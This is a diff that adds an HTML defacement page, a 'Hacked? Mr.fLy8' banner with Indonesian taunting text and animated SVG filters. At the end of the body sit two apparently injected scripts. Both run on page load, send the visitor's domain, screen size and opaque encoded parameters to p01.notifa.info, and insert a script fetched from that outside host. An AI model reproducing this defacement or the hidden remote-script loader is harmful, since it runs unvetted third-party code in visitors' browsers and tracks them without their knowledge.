@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en" >
+
+<style>
+@import url("https://fonts.googleapis.com/css?family=Amatic+SC:400,700");
+body {
+  font-family: 'Amatic SC', sans-serif;
+  font-size: 100px;
+}
+.test {
+  -webkit-animation: squiggly-anim 0.34s linear infinite;
+          animation: squiggly-anim 0.34s linear infinite;
+}
+body {
+  line-height: 100vh;
+  background: #111;
+  color: #fff;
+}
+.test {
+  display: inline-block;
+  vertical-align: middle;
+  width: 100%;
+  outline: none;
+  text-align: center;
+  line-height: 1;
+}
+.small {
+  font-size: 0.5em;
+}
+.smaller {
+  font-size: 0.4em;
+}
+p {
+  margin: 0;
+}
+@-webkit-keyframes squiggly-anim {
+  0% {
+    -webkit-filter: url("#squiggly-0");
+            filter: url("#squiggly-0");
+  }
+  25% {
+    -webkit-filter: url("#squiggly-1");
+            filter: url("#squiggly-1");
+  }
+  50% {
+    -webkit-filter: url("#squiggly-2");
+            filter: url("#squiggly-2");
+  }
+  75% {
+    -webkit-filter: url("#squiggly-3");
+            filter: url("#squiggly-3");
+  }
+  100% {
+    -webkit-filter: url("#squiggly-4");
+            filter: url("#squiggly-4");
+  }
+}
+@keyframes squiggly-anim {
+  0% {
+    -webkit-filter: url("#squiggly-0");
+            filter: url("#squiggly-0");
+  }
+  25% {
+    -webkit-filter: url("#squiggly-1");
+            filter: url("#squiggly-1");
+  }
+  50% {
+    -webkit-filter: url("#squiggly-2");
+            filter: url("#squiggly-2");
+  }
+  75% {
+    -webkit-filter: url("#squiggly-3");
+            filter: url("#squiggly-3");
+  }
+  100% {
+    -webkit-filter: url("#squiggly-4");
+            filter: url("#squiggly-4");
+  }
+}
+</style>
+
+<head>
+  <meta charset="UTF-8">
+  <title>Hello!! á´µá´¬á´¹ áŽ Ä…É¾ÒŸâ„œÃ¬Ö„Ö„Ò½É¾</title>
+  
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+
+  
+      <link rel="stylesheet" href="css/style.css">
+
+  
+</head>
+
+<body>
+
+  <div class="test" contenteditable>
+  Hacked? Mr.fLy8
+  <p class="small">â€“ IM MR.fLY 8 IM HAPPY WITH TIARAAZZAHRA“ <p/>
+  HI YOU! 
+  <p class="small">WKWKWKWKWKW CUMAN BISA BUAT KEK GINIAN , GA LEBIH .</p>
+  <p class="smaller">Ga kaya Cowo lain , Maaf :)</p>
+</div>
+
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
+  <defs>
+
+    
+    <filter id="squiggly-0">
+      <feTurbulence id="turbulence" baseFrequency="0.02" numOctaves="3" result="noise" seed="0"/>
+      <feDisplacementMap id="displacement" in="SourceGraphic" in2="noise" scale="6" />
+    </filter>
+    <filter id="squiggly-1">
+      <feTurbulence id="turbulence" baseFrequency="0.02" numOctaves="3" result="noise" seed="1"/>
+<feDisplacementMap in="SourceGraphic" in2="noise" scale="8" />
+    </filter>
+    
+    <filter id="squiggly-2">
+      <feTurbulence id="turbulence" baseFrequency="0.02" numOctaves="3" result="noise" seed="2"/>
+<feDisplacementMap in="SourceGraphic" in2="noise" scale="6" />
+    </filter>
+    <filter id="squiggly-3">
+      <feTurbulence id="turbulence" baseFrequency="0.02" numOctaves="3" result="noise" seed="3"/>
+<feDisplacementMap in="SourceGraphic" in2="noise" scale="8" />
+    </filter>
+    
+    <filter id="squiggly-4">
+      <feTurbulence id="turbulence" baseFrequency="0.02" numOctaves="3" result="noise" seed="4"/>
+<feDisplacementMap in="SourceGraphic" in2="noise" scale="6" />
+    </filter>
+  </defs> 
+</svg>
+  <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
+
+  
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdjol30yJHnEg2ot4xEuoqEe7H2sT2kzIPlMrhjpIws3rgWN7KHMsYYDtHCgIUftpKqc5wioMf2TzV%2fM8wDj0OTzQ%2fXaqRZPpMdewYa0T8SkWVX2D10LdxG3IkcOGgGNuTEjltxQR8aAUdEnB97RykeL%2fEspGj9%2fyFLFMufW1KMoOHK9U7WMkkShq%2bp8jp%2bgVXeK%2bBAY1H%2baxKPYOa4XwdRvm84QawFY1NBCQ56aipiZ16ra30lk1PBZimpwbQyDhwSSuv68MlUZnGLmUruOaoqgNbt6WfH6fLNbLZXtijh7%2boGEq1%2ft16dq7hw6%2fN3V%2fQBqX7V78JFTb%2fLtX7k2zQIPLxlD2QzVAUmufT6ZEZD%2bvNnIxwWJ7Tths65o%2fTtHgxzdyOGg%2fHdeocWBAQrXwohMQCEa2N3Ul3niY8gSNXWiRY%2bpnRW4NsFAaHw%2fXJm8e5aTNSZogtkOfP7O9mWjJ0c2JYsvjJyK4mres5ku1ootH%2bvkM0ijoFAAme4f%2b0eujW" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdgUKD9PPHQWc6lRslF9D%2fdoMaPWWpK2OukxVGDJrih05ssO9Nt6A%2fc%2bPOAwY0PIEAV7rebFa7YgnG2QX8yy8RDVF3f2PGkyBGpVwoxkXJbOwRrsXHyKzwrJWnT9bTCveUrHW4wG9mGjnJAoA0L4Yb0Sks98QpGT%2b2esZpYmC7EdQHbbO2KR3FzwQE0LGxrhulh9NDJqEfDfSp803v00mkrSSyGABoJ0g7MtATey%2b4k64gTmRcIJbV%2b%2fUsYA05N4eGRmK6Wn4BQATbElCNgaM1UFbR8lixBebK6QUfDIAK3VjYuwYha623NGIPRmbnXEh2UfGp4vHG9mhCdOdg34GkyQ7SypBxHeXIau615GGjbAUmC6CFcdEuAi0qFF21wRjF0RN%2ffJrq39mcvCOBKclW3%2bzR3Gqr5725xhtMp4Cz9Fhn9X%2bCTuXBLuVifNKCrGM2xr1ZD1n4zc8W7TdLjP84JJFL1SPB6OsSoRId9LSLmeD4I2ZJCG2edoHZwqxTA71o1KT3MM9ErB2jeGBesVljms7pdkaYskdIteF1yOEzqlIgGr0x3ObJhLhtdqYu24ZTJQzEjUICfp6q7fXR2k80ln1UQk8bn6Gu" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+</html>
